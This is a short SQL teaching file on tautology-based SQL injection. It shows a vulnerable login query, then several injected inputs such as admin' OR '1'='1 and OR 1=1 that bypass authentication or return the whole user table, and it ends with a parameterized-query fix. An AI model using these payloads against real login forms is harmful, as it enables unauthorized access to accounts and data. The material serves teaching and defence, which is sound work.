-- Tautology-Based SQL Injection
-- Attacker injects an always-true condition so the WHERE clause always matches,
-- frequently used to bypass authentication and retrieve all rows.

-- Vulnerable login query
SELECT * FROM users WHERE username = 'admin' AND password = 'secret';

-- Input username = admin' OR '1'='1 (password anything) -> always true, login granted
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'x';

-- Bypass without guessing a password
SELECT * FROM users WHERE username = '' OR '' = '' AND password = 'x';

-- Retrieve the full user table in one shot
SELECT * FROM users WHERE username = 'x' OR 1=1;

-- Prevention: use parameterized queries so the comparison stays a value comparison
SELECT * FROM users WHERE username = ? AND password = ?;